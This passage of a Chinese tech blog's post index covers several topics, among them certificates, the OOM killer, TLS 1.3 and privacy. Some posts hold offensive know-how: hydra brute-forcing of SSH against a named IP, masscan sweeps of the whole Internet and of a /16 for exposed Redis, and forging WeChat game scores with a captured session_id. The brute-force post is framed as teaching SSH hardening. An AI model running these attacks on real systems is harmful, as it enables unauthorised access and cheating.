支持通配符证书了","slug":"Letsencrypt-支持通配符证书了","date":"2018-01-10T07:06:04.000Z","updated":"2021-02-26T06:05:29.253Z","comments":true,"path":"posts/58090.html","link":"","permalink":"https://awen.me/posts/58090.html","excerpt":"2018 年 1 月 4 号 LetsEncrypt 引入 ACME v2 协议 API 并支持通配符证书的公开的测试 API ，正式发布的日期为 2018 年 2 月 27 日，并且在2018年还计划引入 ECDSA 根证书和中间证书。","text":"2018 年 1 月 4 号 LetsEncrypt 引入 ACME v2 协议 API 并支持通配符证书的公开的测试 API ，正式发布的日期为 2018 年 2 月 27 日，并且在2018年还计划引入 ECDSA 根证书和中间证书。 ECDSA 通常被认为是 Web 上数字签名算法的未来，因为它比 RSA 更有效率。 安装个人认为签发 LetsEncrypt 证书最好的工具就是acme.sh了，不过目前因为是测试版本，我们需要使用其分支来申请 [root@aliyun fangwenjun]# export BRANCH=2 [root@aliyun fangwenjun]# curl https://get.acme.sh | sh [root@aliyun fangwenjun]# alias acme.sh=&quot;/root/.acme.sh/acme.sh&quot;申请通配符证书acme.sh --test --issue -d www.acme.sh -d acme.sh -d *.acme.sh --dns dns_cf 注: 目前仅供尝鲜，并且签发的证书由于没有根服务器所以不受浏览器信任，因此不能用于生产环境，建议等 2月份正式上线。通配符证书不能放在第一个 -d 参数中 恢复如果要恢复，调整分支为 master 即可。 export BRANCH=master curl https://get.acme.sh | sh","categories":[],"tags":[]},{"title":"Linux 的 oom 机制","slug":"Linux-的oom-机制","date":"2018-01-09T07:34:53.000Z","updated":"2021-02-26T06:05:29.256Z","comments":true,"path":"posts/5891.html","link":"","permalink":"https://awen.me/posts/5891.html","excerpt":"Linux 的内核当检测到系统内存不足、挑选并杀掉某个进程的过程可以参考内核源代码 linux/mm/oom_kill.c，当系统内存不足的时候，out_of_memory() 被触发，然后调用 select_bad_process() 选择一个 “bad” 进程杀掉，如何判断和选择一个 “bad” 进程呢，总不能随机选吧？挑选的过程由 oom_badness() 决定，挑选的算法和想法都很简单很朴实：最 bad 的那个进程就是那个最占用内存的进程。","text":"Linux 的内核当检测到系统内存不足、挑选并杀掉某个进程的过程可以参考内核源代码 linux/mm/oom_kill.c，当系统内存不足的时候，out_of_memory() 被触发，然后调用 select_bad_process() 选择一个 “bad” 进程杀掉，如何判断和选择一个 “bad” 进程呢，总不能随机选吧？挑选的过程由 oom_badness() 决定，挑选的算法和想法都很简单很朴实：最 bad 的那个进程就是那个最占用内存的进程。 Out of memory 的问题。通常都是因为某时刻应用程序大量请求内存导致系统内存不足造成的，这通常会触发 Linux 内核里的 Out of Memory (OOM) killer，OOM killer 会杀掉某个进程以腾出内存留给系统用，不致于让系统立刻崩溃。执行 dmesg -T 可以得到类似如下信息 [Tue Jan 9 12:04:19 2018] [54445] 1001 54445 72525 2440 124 0 -998 httpd [Tue Jan 9 12:04:19 2018] [54446] 1001 54446 72531 2419 124 0 -998 httpd [Tue Jan 9 12:04:19 2018] [54447] 1001 54447 72531 2419 124 0 -998 httpd [Tue Jan 9 12:04:19 2018] [54448] 1001 54448 73061 2521 126 0 -998 httpd [Tue Jan 9 12:04:19 2018] [54449] 1001 54449 72531 2419 124 0 -998 httpd [Tue Jan 9 12:04:19 2018] [54450] 1001 54450 72531 2419 124 0 -998 httpd [Tue Jan 9 12:04:19 2018] [54453] 1001 54453 72531 2419 124 0 -998 httpd [Tue Jan 9 12:04:19 2018] [54454] 1001 54454 72531 2515 124 0 -998 httpd [Tue Jan 9 12:04:19 2018] [54459] 1001 54459 72531 2401 124 0 -998 httpd [Tue Jan 9 12:04:19 2018] [54460] 1001 54460 72531 2401 124 0 -998 httpd [Tue Jan 9 12:04:19 2018] [54461] 1001 54461 72531 2404 124 0 -998 httpd [Tue Jan 9 12:04:19 2018] [54462] 1001 54462 72531 2403 124 0 -998 httpd [Tue Jan 9 12:04:19 2018] [54463] 1001 54463 72531 2400 124 0 -998 httpd [Tue Jan 9 12:04:19 2018] [54464] 1001 54464 72531 2399 124 0 -998 httpd [Tue Jan 9 12:04:19 2018] [54465] 1001 54465 72531 2401 124 0 -998 httpd [Tue Jan 9 12:04:19 2018] [54481] 0 54481 9141 125 14 0 1000 combadvisor [Tue Jan 9 12:04:19 2018] [54488] 0 54488 1029 20 8 0 1000 comb.sh [Tue Jan 9 12:04:19 2018] [54490] 0 54490 4436 80 13 0 1000 bash [Tue Jan 9 12:04:19 2018] [54491] 0 54491 1050 23 7 0 -1000 sh [Tue Jan 9 12:04:19 2018] Out of memory: Kill process 53269 (combdeploy) score 1003 or sacrifice child [Tue Jan 9 12:04:19 2018] Killed process 54488 (comb.sh) total-vm:4116kB, anon-rss:80kB, file-rss:0kB [Tue Jan 9 12:04:19 2018] sh invoked oom-killer: gfp_mask=0x2000d0, order=2, oom_score_adj=-1000 [Tue Jan 9 12:04:19 2018] sh cpuset=system mems_allowed=0 [Tue Jan 9 12:04:19 2018] CPU: 1 PID: 54491 Comm: sh Not tainted 3.18.20-nce-amd64 #35 [Tue Jan 9 12:04:19 2018] Hardware name: Bochs Bochs, BIOS Bochs 01/01/2011 [Tue Jan 9 12:04:19 2018] 0000000000000000 0000000000000000 ffffffff8142f7ed ffff88002d8d0a50 [Tue Jan 9 12:04:19 2018] ffffffff8142d8be ffffffff81089448 0000000000000000 0000000000000001 [Tue Jan 9 12:04:19 2018] ffff88008ffdcb00 ffff88008ffdcb00 ffffffff8109e22a ffffffff818b2030 [Tue Jan 9 12:04:19 2018] Call Trace: [Tue Jan 9 12:04:19 2018] [&lt;ffffffff8142f7ed&gt;] ? dump_stack+0x41/0x51 [Tue Jan 9 12:04:19 2018] [&lt;ffffffff8142d8be&gt;] ? dump_header+0x6f/0x1e2 [Tue Jan 9 12:04:19 2018] [&lt;ffffffff81089448&gt;] ? rcu_batches_completed+0x8/0x8 [Tue Jan 9 12:04:19 2018] [&lt;ffffffff8109e22a&gt;] ? smp_call_function_single+0x6d/0x82 [Tue Jan 9 12:04:19 2018] [&lt;ffffffff8143361e&gt;] ? _raw_spin_unlock_irqrestore+0xc/0xd [Tue Jan 9 12:04:19 2018] [&lt;ffffffff810e4241&gt;] ? oom_kill_process+0x72/0x2f0 [Tue Jan 9 12:04:19 2018] [&lt;ffffffff810e3ffd&gt;] ? find_lock_task_mm+0x1e/0x6b [Tue Jan 9 12:04:19 2018] [&lt;ffffffff810e4a4c&gt;] ? out_of_memory+0x42f/0x462可以看到 Out of memory: Kill process 53269 (combdeploy) 表示process 53269 最先被 kill","categories":[],"tags":[]},{"title":"让 Mac 微信支持免认证登录","slug":"让mac-微信支持免认证登录","date":"2018-01-08T11:29:54.000Z","updated":"2021-02-26T06:05:29.357Z","comments":true,"path":"posts/33106.html","link":"","permalink":"https://awen.me/posts/33106.html","excerpt":"有时候，我觉得微信的有些设计就是脑残，或者说国内很多互联网企业提供的服务在设计上都不考虑人性不人性化，而是为了装机量，宁愿牺牲便捷性，比如说腾讯的微信不支持客户端密码登录，非要脑残一样设计个手机扫一下，比如一些电商网站为了移动用户数非要设计个扫二维码登录，在比如傻逼百度，注销个帐号还非要下个手机百度客户端注销，而且还注销不了。","text":"有时候，我觉得微信的有些设计就是脑残，或者说国内很多互联网企业提供的服务在设计上都不考虑人性不人性化，而是为了装机量，宁愿牺牲便捷性，比如说腾讯的微信不支持客户端密码登录，非要脑残一样设计个手机扫一下，比如一些电商网站为了移动用户数非要设计个扫二维码登录，在比如傻逼百度，注销个帐号还非要下个手机百度客户端注销，而且还注销不了。 正题，因为工作需要对接客户，所以需要使用微信客户端，我最头疼的就是当手机没电了或者手机不再身边，我想打开个微信，还必须扫码，不能输入用户名和密码登录，这真的很头疼。 今天发现个插件解决了我这个问题，只要微信不退出，可以自动免认证登录，目前来看还是很好用的。 安装 cd ~/Downloads &amp;&amp; git clone https://github.com/TKkk-iOSer/WeChatPlugin-MacOS.git &amp;&amp; ./WeChatPlugin-MacOS/Other/Install.sh安装完毕就是这个样子 具体看个github 介绍吧","categories":[],"tags":[{"name":"微信","slug":"微信","permalink":"https://awen.me/tags/%E5%BE%AE%E4%BF%A1/"}]},{"title":"本站支持 TLSv 1.3","slug":"本站支持-TLSv1-3","date":"2018-01-08T11:03:18.000Z","updated":"2021-02-26T06:05:29.342Z","comments":true,"path":"posts/52298.html","link":"","permalink":"https://awen.me/posts/52298.html","excerpt":"科普 TLS 1.3TLS 1.3 协议针对安全强化及效率提升等方面进行了大量修改，相继推出20多个草案版本，即将完成最终的标准化。完成后，OpenSSL组织将推出OpenSSL 1.1.1 版本对 TLS1.3 协议标准提供支持。","text":"科普 TLS 1.3TLS 1.3 协议针对安全强化及效率提升等方面进行了大量修改，相继推出20多个草案版本，即将完成最终的标准化。完成后，OpenSSL组织将推出OpenSSL 1.1.1 版本对 TLS1.3 协议标准提供支持。 本文主要讲解 TLS 1.3 版本的相关特性以及如何在你的服务器上启用 TLS 1.3 的支持。 在谈 TLS 1.3 之前，我们先来看下 TLS 1.2 的工作模式，如图所示是 TLS 1.2 客户端和服务端交互的过程，如图所示: 我们也可以通过 Wireshark 抓包得到的数据 以 ECDHE 密钥交换算法为例，TLS1.2协议完整的SSL握手过程如下: 第一步，首先客户端发送ClientHello消息，该消息中主要包括客户端支持的协议版本、加密套件列表及握手过程需要用到的ECC扩展信息； 第二步，服务端回复ServerHello，包含选定的加密套件和ECC扩展；发送证书给客户端；选用客户端提供的参数生成ECDH临时公钥，同时回复ServerKeyExchange消息； 第三步，客户端接收ServerKeyExchange后，使用证书公钥进行签名验证，获取服务器端的ECDH临时公钥，生成会话所需要的共享密钥；生成ECDH临时公钥和ClientKeyExchange消息发送给服务端； 第四步，服务器处理ClientKeyExchange消息，获取客户端ECDH临时公钥；服务器生成会话所需要的共享密钥；发送密钥协商完成消息给客户端； 第五步，双方使用生成的共享密钥对消息加密传输，保证消息安全。 可以看到，TLS1.2 协议中需要加密套件协商、密钥信息交换、ChangeCipherSpec 协议通告等过程，需要消耗 2-RTT 的握手时间，这也是造成 HTTPS 协议慢的一个重要原因之一。 我们来看下 TLS 1.3 的的交互过程，如图所示: 其抓包得到的数据流如下: 在 TLS 1.3 中，客户端首先不仅发送 ClientHello 支持的密码列表，而且还猜测服务器将选择哪种密钥协商算法，并发送密钥共享,这可以节省很大一部分的开销，从而提高了速度。 TLS1.3 提供 1-RTT 的握手机制，还是以 ECDHE 密钥交换过程为例，握手过程如下。将客户端发送 ECDH 临时公钥的过程提前到 ClientHello ，同时删除了 ChangeCipherSpec 协议简化握手过程，使第一次握手时只需要1-RTT，来看具体的流程: 客户端发送 ClientHello 消息，该消息主要包括客户端支持的协议版本、DH密钥交换参数列表KeyShare； 服务端回复 ServerHello，包含选定的加密套件；发送证书给客户端；使用证书对应的私钥对握手消息签名，将结果发送给客户端；选用客户端提供的参数生成 ECDH 临时公钥，结合选定的 DH 参数计算出用于加密 HTTP 消息的共享密钥；服务端生成的临时公钥通过 KeyShare 消息发送给客户端； 客户端接收到 KeyShare 消息后，使用证书公钥进行签名验证，获取服务器端的 ECDH 临时公钥，生成会话所需要的共享密钥； 双方使用生成的共享密钥对消息加密传输，保证消息安全。 如果客户端之前已经连接，我们有办法在 1.2 中进行 1-RTT 连接，而在 TLS 1.3 中允许我们执行 0-RTT连接，如图所示: 需要说明的是，如需查看 TLS 1.3 的报文，需要使用 2.5 版本的wireshark，可以去 https://www.wireshark.org/download/automated/ 下载 TLS 1.3 的新特性密钥交换完全支持 PFSTLS 1.3 协议中选取的密钥交换算法均支持前向安全性。斯诺登事件之后互联网企业开始重视加密算法的前向安全性，防止私钥被破解之后历史数据也能被解密成明文。 为了达到上述安全目的，TLS1.3 协议中废除了不支持前向安全性的RSA和静态DH密钥交换算法。 废弃 DSA 证书DSA证书作为历史遗留产物，因安全性差，从未被大规模应用，故在 TLS1.3 协议中被废弃。 RSA 填充模式更改协议中规定RSA填充模式使用PSS。 禁用自定义的 DH 组参数如果选用了不“安全”的素数作为 DH 的组参数，并且使用静态DH密码套件或使用默认 OpenSSL 配置的DHE加密套件（特别是SSL_OP_SINGLE_DH_USE选项未设置），就很容易受到 Key Recovery Attack 攻击。 因此 TLS1.3 协议中禁用自定义的DH组参数。 对称加密禁用 CBC 模式针对 CBC 模式加密算法的攻击，历史上出现过两次，分别是 2011 年BEAST和2013年Lucky 13，实践证明这种对称加密模式确实存在安全隐患。 禁用 RC4 流加密算法研究人员发现了 BEAST 攻击，该攻击针对所有基于 CBC 模式的加密算法。为解决这个问题，专家建议采用非CBC 模式且普及率较高的 RC4 算法作为替代方案，由此 RC4 算法得到广泛应用。 随着 TLS 版本的演进，BEAST 攻击可通过升级到新版本解决，不必要采用 RC4 这种陈旧算法来替代。另外，2013 年英国皇家哈洛威学院的研究人员发现了一种针对TLS的攻击，该攻击可以从 RC4 算法加密的密文中恢复出少量明文，证明了这种算法无法提供让人放心的安全等级。 为防止 RC4 算法被彻底破解，导致之前加密的网络流量被解密出现严重的安全事故，互联网公司逐渐废弃了这个算法。2014年，CloudFlare 将 RC4 算法的优先级从最高降为最低。2015 年，IETF 组织在 rfc7465 中明确指出要禁用 RC4 流加密算法。 禁用SHA1大约在2015年 SHA1 就存在理论上的漏洞，可能造成碰撞攻击。 2013 年开始微软、Google、Symantec 等相关厂商相继公布 SHA1 证书的升级计划并宣布 2017 年将开始停止信任 SHA1 证书。 2017 年初 Google 与荷兰研究机构 CWI Amsterdam 共同宣布破解 SHA1，将 SHA1 的碰撞攻击从理论转变为现实。 禁用出口密码套件出口密码套件是指上世纪 90 年代美国政府为让 NSA 能够破解所有加密的外国通讯消息，规定其出口的必须是安全性较弱的密码套件，例如私钥长度不大于 512 的 RSA 加密算法，这类加密套件被称为出口密码套件。在当时，安全等级较高的加密套件被是为战争武器禁止出口。 尽管 2000 年之后美国放宽了密码出口管制，但是由于历史遗留问题，许多实际场景中仍使用出口加密套件进行协商，导致 FREAK 和 LogJam 攻击的出现，这两种攻击通过中间人将加密套件降级成出口套件，进而将破解数据。 禁用 TLS 压缩由于 TLS 压缩存在安全漏洞，TLS1.3 协议删除了该特性。 加密握手消息TLS 1.3 协议中规定在 ServerHello 消息之后的握手信息需要加密。TLS1.2 及之前版本的协议中各种扩展信息在 ServerHello 中以明文方式发送，新版本中可在加密之后封装到 EncryptedExtension 消息中，在ServerHello 消息之后发送，提高数据安全性。 效率提升对于互联网服务而言更快的页面加载意味着更好的用户体验，从而也能带动产品销售的提升。 HTTPS 在提高网络安全的同时却增加了额外的性能消耗，包括额外的 SSL 握手交互过程，数据加解密对 CPU 的消耗等。TLS 1.3 在提高效率方面进行了大量改进，特别是对 SSL 握手过程进行了重新设计，将握手交互延时从 2-RTT 降低至 1-RTT 甚至是 0-RTT。在网络环境较差或节点距离较远的情况下，这种优化能节省几百毫秒的时间。这几百毫秒往往就能决定用户下一步的行为是继续浏览网页还是关闭网页。 0-RTT模式不具有前向安全性，且消息可能被用作重放攻击，所以安全性较低，需慎重使用。 浏览器支持 TLS 1.3目前最新版 Chrome 和 Firefox 都支持 TLS 1.3，但需要手动开启： Chrome，将 chrome://flags/ 中的 Maximum TLS version enabled 改为 TLS 1.3（Chrome 62 中需要将 TLS 1.3 改为 Enabled (Draft) Firefox，将 about:config 中的 security.tls.version.max 改为 4； Web 服务器支持 TLS 1.3首先，需要下载 openssl 开发版，目前 TLS 1.3 还处于 draft 版，所以要克隆其分支进行编译。 git clone -b tls1.3-draft-18 --single-branch https://github.com/openssl/openssl.git openssl 注意: github 的最新版本 tls1.3-draft-19 编译后并不会有效果 以 nginx 1.13.8 为例(自 1.13.0 开始 nginx 开始支持 TLSv1.3)，在编译的时候加上 --with-openssl=../openssl --with-openssl-opt=&apos;enable-tls1_3 enable-weak-ssl-ciphers&apos;例如我的编译参数 ./configure --prefix=/usr/local/nginx --user=www --group=www --with-pcre=/opt/nginx/pcre-8.41 --with-http_ssl_module --with-zlib=/opt/nginx/zlib-1.2.11 --with-http_v2_module --add-module=../nginx-ct-1.3.2 --add-module=../ngx_brotli --with-openssl=../openssl --with-openssl-opt=&apos;enable-tls1_3 enable-weak-ssl-ciphers&apos; --with-http_v2_module --with-http_ssl_module --with-http_gzip_static_module编译完成停止你的 nginx 进程，在 nginx 目录执行如下命令 cp -rf ./objs/nginx /usr/local/nginx/sbin/ 在你的 nginx 配置文件中添加如下配置 ssl_protocols TLSv1.2 TLSv1.3; #增加 TLSv1.3 ssl_ciphers TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-128-CCM-8-SHA256:TLS13-AES-128-CCM-SHA256:EECDH+CHACHA20:EECDH+CHACHA20-draft:EECDH+ECDSA+AES128:EECDH+aRSA+AES128:RSA+AES128:EECDH+ECDSA+AES256:EECDH+aRSA+AES256:RSA+AES256:EECDH+ECDSA+3DES:EECDH+aRSA+3DES:RSA+3DES:!MD5;重启 nginx 服务。 CDN 支持 TLS 1.3目前又拍云已经率先支持 TLS 1.3，你可以在控制台开启 开启后通过浏览器访问可以看到协议版本","categories":[],"tags":[]},{"title":"分享图片千万别发原图","slug":"分享图片千万别发原图","date":"2018-01-06T01:25:42.000Z","updated":"2021-02-26T06:05:29.315Z","comments":true,"path":"posts/52331.html","link":"","permalink":"https://awen.me/posts/52331.html","excerpt":"现在很多智能手机，比如安卓、iPhone 拍摄的照片默认情况下都会携带很多信息，我们称它为 Exif 信息。","text":"现在很多智能手机，比如安卓、iPhone 拍摄的照片默认情况下都会携带很多信息，我们称它为 Exif 信息。 Exif 包含了你拍摄的照片的时间、GPS 定位信息、图片大小、经度、纬度、快门时间等等，如果你冒然的将原图发在了网上，比如微博、推特上，那么稍微懂点技术的人都能够拿到你的exif 信息人肉你 你可能会注意到，iPhone 自带的相册或一些照片管理软件，比如谷歌相册，能够根据你的拍摄照片的地理位置给你的照片进行归类 其实它就是通过读取 Exif 的 GPS 信息来的。 比如这么一张照片 我们通过专业的软件就可以看到它的 Exif 信息 包括手机的型号、快门的速度，软件的版本等等。 你可以想象一下，你不经意间发送的一张照片可以暴露你这么多信息，是不是有点恐怖 那么怎么办呢？ 第一种方法就是关闭相机的定位权限，以iphone为例，设置–通用-访问限制–隐私（定位服务）–相机-允许访问位置信息设置为永不 不过关闭了定位权限可能你的照片就不能被按地区管理了。 第二种方法是发送图片的时候去掉 exif 信息，还是以iphone 为例，安装 ViewExif 软件后，打开相册，找到你需要发送的图片，选择后选择 ViewExif 然后可以选择保存一份没有 exif 的信息或直接分享不带 exif信息的图片 大数据时代没有绝对的隐私，但是我们也需要尽可能的保护自己的信息不被非法利用。 我们无法做到完全与互联网隔离，毕竟互联网的的确确改变着这个时代和我们的实际生活，但是我始终认为任何东西都有两面性，技术也是一把双刃剑，我们在利用技术改变生活的时候也要防范技术给我们带来的危害。 尤其是国内的互联网行业非常不规范，比如国内的安卓生态，各种软件互相唤醒、不给权限就不给用，要着一些和自己本应该做的事情完全不符合的权限，尤其是喜欢读取通讯录权限。 因此保护隐私，只能靠我们自己，不要相信任何企业提供的服务，在注册各种服务前先确定是不是一定要给他们提供各种信息，比如邮箱、手机号、身份证信息。一些不是必须要用的服务或网站我们完全可以留个假信息给他，比如邮箱使用那种10分钟邮箱，电话嘛用代收短信的服务或类似阿里小号这种，身份证这个自己搞定、密码不要用相同的密码（我一直推荐使用类似 1password 这种密码管理软件管理你的密码），不同的网站的密码都是随机生成，这样就不会撞库了。 如果确实要提供身份证信息，一定要记得给照片打上水印，比如“仅限办理xxx服务使用，他用无效“，我们要假设提供服务的企业是不可靠的，因为你无法预估你把信息给他之后他如何保存你的数据，比如身份证信息，如果不打水印，企业的内部可能会贩卖你的信息、企业的数据库可能被黑客攻击等等都有可能使你的信息被泄漏。不要看着一些网站写着数据加密多么严格、符合什么什么加密标准，千万不要信。这个世界上没有绝对安全的系统，就好比最近的 intel CPU 都被爆出之前的所有系列 CPU 都存在泄漏数据的漏洞。openssl 这种加密软件都还存在心血漏洞。你怎么能相信企业的广告语？ 另外我讨厌这个实名制的和所谓的大数据社会。 相信我，保护你的隐私轻者可以少让你收到一些垃圾短信和骚扰电话，重者甚至能够保护你的生命安全！哦弥陀佛！ 最后推荐各位看下黑客怎么通过你网上发布的内容找到你:知乎：如何防止自己被人肉","categories":[],"tags":[]},{"title":"Surge 获取 https请求内容","slug":"Surge-获取-https请求内容","date":"2018-01-05T08:14:31.000Z","updated":"2021-02-26T06:05:29.266Z","comments":true,"path":"posts/47511.html","link":"","permalink":"https://awen.me/posts/47511.html","excerpt":"设置mac1.首先，将代理设置为0.0.0.0 2.切换到 HTTPS，生成证书后将证书安装到系统，并且添加主机名为 * 或你希望抓取的域名","text":"设置mac1.首先，将代理设置为0.0.0.0 2.切换到 HTTPS，生成证书后将证书安装到系统，并且添加主机名为 * 或你希望抓取的域名 3.然后点击为iOS 模拟器导出证书，导出的证书后缀为crt，先放着。 4.打开钥匙串，找到Surge的证书 双击，设置为信任 设置手机5.将导出的crt证书发送到手机并安装 6.然后点击手机设置-通用-关于手机-证书信任设置-开启surge的证书 7.保证局域网内安装surge的电脑和手机在同一个 IP 段。找到Wi-Fi，点击Wi-Fi后的感叹号，找到 “HTTP 代理”–点击进入选择手动-填写服务器 IP 为 MAC 的 IP，端口为 Surge 的 HTTP 端口 抓包8.打开 Surge 的控制台。手机随便访问个https页面，会在控制台看到远程客户端 9.点击 HTTPS 请求查看请求的请求头和响应头以及数据","categories":[],"tags":[{"name":"surge","slug":"surge","permalink":"https://awen.me/tags/surge/"}]},{"title":"微信跳一跳抓包获取数据修改分数","slug":"微信跳一跳抓包获取数据修改分数","date":"2018-01-04T10:21:03.000Z","updated":"2021-02-26T06:05:29.334Z","comments":true,"path":"posts/27810.html","link":"","permalink":"https://awen.me/posts/27810.html","excerpt":"1.首先第一步，参考我之前的文章安装chareles 并连接手机。 2.打开跳一跳后，不要点开始，查看请求，找到 mp.weixin.qq.com/wxagame/wxagame_init","text":"1.首先第一步，参考我之前的文章安装chareles 并连接手机。 2.打开跳一跳后，不要点开始，查看请求，找到 mp.weixin.qq.com/wxagame/wxagame_init 复制session_id 的值 然后GitHub有很多脚本 比如上面这个nodejs版本的 安装nodejs后，从GitHub 下载代码后进入到目录执行 npm init --y npm install crypto-js request-promise npm install request --save修改score 为你需要的分数，session_id 为你的 session_id var version = 5, score = 2018, // replace with your session_id here session_id = &apos;xxxxx&apos;执行 查看 原理 先利用 charles 抓取微信小程序的请求并解密，然后获取 session_id 后模拟 http post请求向微信服务器提交数据。 更新1.目前该方式已经凉了，请不要尝试了。","categories":[],"tags":[]},{"title":"暴力破解 SSH 密码","slug":"暴力破解-SSH-密码","date":"2017-12-28T07:33:08.000Z","updated":"2021-02-26T06:05:29.341Z","comments":true,"path":"posts/21538.html","link":"","permalink":"https://awen.me/posts/21538.html","excerpt":"本文主要讲解 SSH 的安全知识，让大家认识到 SSH 不要用密码登录。 准备工具 masscan hydra 词典 安装sudo apt-get install masscan hydra","text":"本文主要讲解 SSH 的安全知识，让大家认识到 SSH 不要用密码登录。 准备工具 masscan hydra 词典 安装sudo apt-get install masscan hydra masscan 的使用请参考:文章 第一步，找到目标主机的 SSH 端口root@ubuntu:~# masscan -p0-65535 59.111.95.153/32 --rate 10000 Starting masscan 1.0.3 (http://bit.ly/14GZzcT) at 2017-12-28 07:37:16 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [65536 ports/host] Discovered open port 22/tcp on 59.111.95.153可以看到该服务器默认使用了 22 端口。 我们准备一个词典文件，pass.txt，假设里面包含了真实密码 执行 root@ubuntu:~# hydra -s 22 -v -l root -P pass.txt 59.111.95.153 ssh参数解释： -s 指定远程主机端口 -v 显示详细信息 -l 指定登录的用户 -P 指定词典文件 可以看到，当确认可以登录后，会显示对应的密码。 我们尝试登录，发现可以登录的。 root@ubuntu:~# ssh root@59.111.95.153 root@59.111.95.153&apos;s password: Last failed login: Thu Dec 28 15:39:11 CST 2017 from 59.111.94.46 on ssh:notty There were 4 failed login attempts since the last successful login. Last login: Thu Dec 28 15:30:28 2017 from 59.111.94.46 [root@cetnos ~]#以上只是简单的演示，其实只要机器的运算速度足够快，词典足够强大，破解一些密码是没问题的，而且大部分人设置密码都是一些生日啊、纪念日还有一些弱密码。现在很多人都注册很多大大小小网站，有些小网站本身安全方面就欠缺，如果你在很多网站设置了同样的密码，那么很容易撞库，黑客通过分析你的密码习惯，也可以很容易猜到你的密码是什么？不要觉得不可思议，一些黑产拥有你的信息可能比你亲妈还了解你在网上一天干些啥。比如你什么时间买了什么东西、在哪里买的，寄到哪里去了，电话号码，信用卡卡号等等信息。不信，你可以想象一下你每天接到的那些垃圾骚扰短信和电话，你的信息是怎么被卖出去的，一方面是一些企业非法出售个人信息，另一方面黑产会不断在网上扫各个网站的服务器漏洞窃取数据库的数据。 如何加防 SSH我们可以从以下几个方面加防 SSH。 1.首先，千万不要开启 root，应当使用普通的三无权限用户登录，配置文件修复配置如下: PermitRootLogin no2.禁止密码登录，采用 ssh 密钥的方式登录，配置文件修复配置如下: PasswordAuthentication yes 然后创建普通用户和密钥 [root@cetnos ~]# useradd test [root@cetnos ~]# passwd test Changing password for user test. New password: Retype new password: passwd: all authentication tokens updated successfully. [root@cetnos ~]# su test [test@cetnos root]$ cd ~ [test@cetnos ~]$ ssh-keygen -t rsa Generating public/private rsa key pair. Enter file in which to save the key (/home/test/.ssh/id_rsa): Created directory &apos;/home/test/.ssh&apos;. Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /home/test/.ssh/id_rsa. Your public key has been saved in /home/test/.ssh/id_rsa.pub. The key fingerprint is: SHA256:nbcN9rAJflXZkbQrf82wzGzvLaECrg3pCfzhbnuL6Nc test@cetnos.novalocal The key&apos;s randomart image is: +---[RSA 2048]----+ | .o.| | .=| | oo| | . . ..| | S + =.o. | | . ... + &amp;++.| | o +o .. =.Oo+| | *o*E ......o| | .o+X+o. . o+| +----[SHA256]-----+ 首次登录使用如下命令将自己的公钥拷贝到服务器，然后关闭密码登录 ssh-copy-id username@ip3.重要业务，请使用跳板机登录，并只允许某个 IP 或 IP 段登录 SSH 服务 4.修改默认端口，配置文件修复配置如下，例如将 22 改成 63332 Port 633325.限制重试次数 #MaxAuthTries 6 #MaxSessions 107.给ssh文件赋予特殊权限位，避免被黑之后往 SSH目录写入内容 [root@cetnos test]# chattr +i /home/test/.ssh/ [root@cetnos test]# chattr +i /home/test/.ssh/id_rsa.pub [root@cetnos test]# chattr +i /home/test/.ssh/id_rsa8.如必须使用密码登录，请安装一些第三方的软件限制频繁输入错误的 IP 登录，比如 fail2ban sudo apt-get install fail2ban 新建配置文件 root@ubuntu1:~# cat /etc/fail2ban/jail.local [DEFAULT] bantime = 86400 maxretry = 3 findtime = 600 [ssh-iptables] enabled = true filter = sshd action = iptables[name=SSH, port=ssh, protocol=tcp] maxretry = 3启动 /etc/init.d/fail2ban restart查看日志 root@ubuntu1:~# tail -f /var/log/fail2ban.log 2017-12-28 17:19:09,115 fail2ban.jail [2490]: INFO Jail &apos;sshd&apos; started 2017-12-28 17:19:09,122 fail2ban.jail [2490]: INFO Jail &apos;ssh-iptables&apos; started 2017-12-28 17:22:07,855 fail2ban.filter [2490]: INFO [sshd] Found 59.111.94.46 2017-12-28 17:22:09,675 fail2ban.filter [2490]: INFO [sshd] Found 59.111.94.46 2017-12-28 17:22:18,676 fail2ban.filter [2490]: INFO [sshd] Found 59.111.94.46 2017-12-28 17:22:19,434 fail2ban.actions [2490]: NOTICE [sshd] Ban 59.111.94.46查看防火墙 root@ubuntu1:~# iptables -L -n Chain INPUT (policy ACCEPT) target prot opt source destination f2b-SSH tcp -- 0.0.0.0/0 0.0.0.0/0 tcp dpt:22 f2b-sshd tcp -- 0.0.0.0/0 0.0.0.0/0 multiport dports 22 Chain FORWARD (policy ACCEPT) target prot opt source destination Chain OUTPUT (policy ACCEPT) target prot opt source destination Chain f2b-SSH (1 references) target prot opt source destination RETURN all -- 0.0.0.0/0 0.0.0.0/0 Chain f2b-sshd (1 references) target prot opt source destination REJECT all -- 59.111.94.46 0.0.0.0/0 reject-with icmp-port-unreachable RETURN all -- 0.0.0.0/0 0.0.0.0/0","categories":[],"tags":[{"name":"ssh","slug":"ssh","permalink":"https://awen.me/tags/ssh/"}]},{"title":"使用masscan 扫描 IP 端口","slug":"使用masscan-扫描-IP-端口","date":"2017-12-28T04:43:00.000Z","updated":"2021-02-26T06:05:29.310Z","comments":true,"path":"posts/29891.html","link":"","permalink":"https://awen.me/posts/29891.html","excerpt":"以前用 nmap 检测，发现当修改了自定义端口后，他就没有那么准确了，比如说把SSH端口修改为其他的。 后来发现了masscan，这个号称可以在3分钟内扫描全网端口的神器。于是尝试了下确实很厉害。 安装sudo apt-get install masscan","text":"以前用 nmap 检测，发现当修改了自定义端口后，他就没有那么准确了，比如说把SSH端口修改为其他的。 后来发现了masscan，这个号称可以在3分钟内扫描全网端口的神器。于是尝试了下确实很厉害。 安装sudo apt-get install masscan 扫描全网masscan -p0-65525 0.0.0.0/0 扫描指定IP段和指定端口例如扫描开发了公网redis 默认端口的设备 masscan -p6379 59.111.0.0/16 --rate 10000 -oX scan.xml则输出结果 或者 masscan -p6379 59.111.0.0/16 --rate 10000 &gt;&gt; scan.txt输出结果masscan 0.0.0.0/0 -p0-65535 -oX scan.xml发包速度传输速度masscan的发包速度非常快，在windows中，它的发包速度可以达到每秒30万包；在Linux中，速度可以达到每秒160万。masscan在扫描时会随机选择目标IP，所以不会对远程的主机造成压力。 默认情况下，masscan的发包速度为每秒100包，为了提高速度，可以设置为 –rate 100000 详细参数&lt;ip/range&gt; 